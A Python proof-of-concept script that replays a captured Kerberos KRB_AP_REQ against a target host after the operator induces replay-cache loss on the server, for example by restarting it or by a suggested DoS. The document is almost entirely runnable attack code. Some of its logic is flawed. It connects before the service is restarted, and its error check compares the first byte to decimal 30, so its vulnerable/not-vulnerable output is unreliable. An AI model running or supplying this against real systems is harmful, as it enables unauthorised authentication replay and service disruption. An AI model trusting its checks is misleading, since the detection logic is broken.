#!/usr/bin/env python3
"""
Proof-of-Concept: Kerberos Replay Attack via Replay Cache Loss

This script demonstrates the vulnerability described in RFC 4120, Section 3.2.3 and 10.
It simulates an attacker who has captured a valid KRB_AP_REQ message and replays it
after the target server has lost its replay cache (e.g., due to a restart or cache overflow).

Prerequisites:
- A captured KRB_AP_REQ packet (hex dump or pcap)
- Ability to trigger replay cache loss on the target server
- Network access to the target server

Usage:
python3 poc_replay_attack_via_replay_cache_loss.py <target_ip> <target_port> <captured_ap_req_hex>
"""

import sys
import socket
import struct
import time
import argparse

def parse_args():
    parser = argparse.ArgumentParser(description="Kerberos Replay Attack PoC")
    parser.add_argument("target_ip", help="IP address of the target Kerberos service")
    parser.add_argument("target_port", type=int, help="Port of the target Kerberos service")
    parser.add_argument("captured_ap_req_hex", help="Hex string of the captured KRB_AP_REQ message")
    return parser.parse_args()

def hex_to_bytes(hex_str):
    """Convert a hex string to bytes."""
    return bytes.fromhex(hex_str.replace(" ", "").replace("\n", ""))

def send_raw_message(sock, message_bytes):
    """Send raw bytes over a TCP socket."""
    sock.sendall(message_bytes)
    print("[*] Sent KRB_AP_REQ message.")

def receive_response(sock, timeout=5):
    """Receive response from the socket with a timeout."""
    sock.settimeout(timeout)
    try:
        response = b""
        while True:
            data = sock.recv(4096)
            if not data:
                break
            response += data
            # Simple heuristic: if we get a reasonable amount of data, assume it's complete
            if len(response) > 100:
                break
        return response
    except socket.timeout:
        print("[!] No response received within timeout.")
        return None
    except Exception as e:
        print(f"[!] Error receiving response: {e}")
        return None

def main():
    args = parse_args()
    target_ip = args.target_ip
    target_port = args.target_port
    captured_ap_req_hex = args.captured_ap_req_hex

    print(f"[*] Target: {target_ip}:{target_port}")
    print("[*] Captured KRB_AP_REQ (hex):", captured_ap_req_hex[:64] + "...")

    # Convert hex to bytes
    try:
        ap_req_bytes = hex_to_bytes(captured_ap_req_hex)
    except Exception as e:
        print(f"[!] Failed to parse hex string: {e}")
        sys.exit(1)

    # Step 1: Establish connection to the target service
    print("[*] Establishing connection to target...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        print("[*] Connected to target.")
    except Exception as e:
        print(f"[!] Failed to connect to target: {e}")
        sys.exit(1)

    # Step 2: Wait for user to induce replay cache loss
    print("[!] IMPORTANT: Now induce replay cache loss on the target server.")
    print("    (e.g., restart the service, flush the cache, or trigger a DoS)")
    input("[*] Press Enter once the cache has been cleared and the service is back up...")

    # Step 3: Replay the captured KRB_AP_REQ
    print("[*] Replaying captured KRB_AP_REQ...")
    send_raw_message(sock, ap_req_bytes)

    # Step 4: Observe the response
    print("[*] Waiting for response...")
    response = receive_response(sock)

    if response:
        print("[*] Received response from server.")
        # Analyze the response
        # A successful authentication might result in application-specific data
        # A failure might result in a KRB_ERROR message
        # For demonstration, we'll just print the first few bytes
        print(f"[*] Response (first 64 bytes): {response[:64].hex()}")
        
        # Check for common Kerberos error indicators
        # KRB_ERROR messages start with a specific message type (30)
        if len(response) > 0 and response[0] == 30:
            print("[!] Server returned a KRB_ERROR message.")
            print("    This indicates the replay was detected and rejected.")
            print("    The server is likely NOT vulnerable to this attack.")
        else:
            print("[+] Server did not return a KRB_ERROR message.")
            print("    This may indicate the replay was accepted.")
            print("    The server might be vulnerable to this attack.")
            print("    Further analysis of the response is recommended.")
    else:
        print("[!] No response received. The server might be vulnerable or the connection was closed.")

    # Cleanup
    sock.close()
    print("[*] Connection closed.")

if __name__ == "__main__":
    main()
